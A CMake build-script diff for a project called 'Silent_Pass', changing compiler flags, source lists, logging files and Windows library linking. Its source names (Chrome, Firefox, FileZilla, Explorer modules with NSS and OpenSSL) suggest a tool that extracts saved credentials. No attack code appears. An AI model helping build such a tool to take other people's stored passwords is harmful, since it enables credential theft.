@@ -8,6 +8,7 @@ set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/staticlibs)
 set(CMAKE_LIBRARY_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/staticlibs)
 set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin)
 
+set(CMAKE_C_FLAGS ${CMAKE_C_FLAGS} "-Wall -Wextra -Wno-pointer-sign -DLIBXML_STATIC")
 
 ### Includes ### 
 
@@ -16,14 +17,17 @@ include_directories(includes includes/nss includes/nspr)
 
 ### Sources ###
 
-set(SOURCES src/chrome.c src/firefox.c src/filezilla.c src/main.c src/utilities/functions.c src/utilities/json.c src/utilities/base64.c src/utilities/xml.c src/utilities/log.c)
+set(SOURCES src/chrome.c src/firefox.c src/filezilla.c src/main.c)
+set(SOURCES ${SOURCES} src/utilities/functions.c src/utilities/json.c src/utilities/base64.c src/utilities/xml.c src/utilities/log/log.c)
 
 if(WIN32)
 	set(SOURCES ${SOURCES} src/win32/chrome.c src/win32/explorer.c src/win32/firefox.c src/win32/specific.c src/win32/filezilla.c)
+	set(SOURCES ${SOURCES} src/utilities/log/log_win.c)
 endif(WIN32)
 
 if(UNIX)
 	set(SOURCES ${SOURCES} src/linux/chrome.c src/linux/firefox.c src/linux/specific.c src/linux/filezilla.c)
+	set(SOURCES ${SOURCES} src/utilities/log/log_linux.c)
 endif(UNIX)
 
 add_executable(Silent_Pass ${SOURCES})
@@ -75,6 +79,9 @@ endif(UNIX)
 if(WIN32)
 	set(OPENSSL_SOURCES ${CMAKE_SOURCE_DIR}/lib/win32/libcrypto_s.a)
 	set(LIBXML2_SOURCES ${CMAKE_SOURCE_DIR}/lib/win32/libxml2.a)
+	set(LIBZ_SOURCES ${CMAKE_SOURCE_DIR}/lib/win32/libz.a)
+
+	target_link_libraries(Silent_Pass ${LIBXML2_SOURCES})
+	target_link_libraries(Silent_Pass ${LIBZ_SOURCES})
 	target_link_libraries(Silent_Pass ${OPENSSL_SOURCES} crypt32 ws2_32 gdi32 m pthread)
-	target_link_libraries(Silent_Pass xml2 ${LIBXML2_SOURCES} iconv z)
 endif(WIN32)
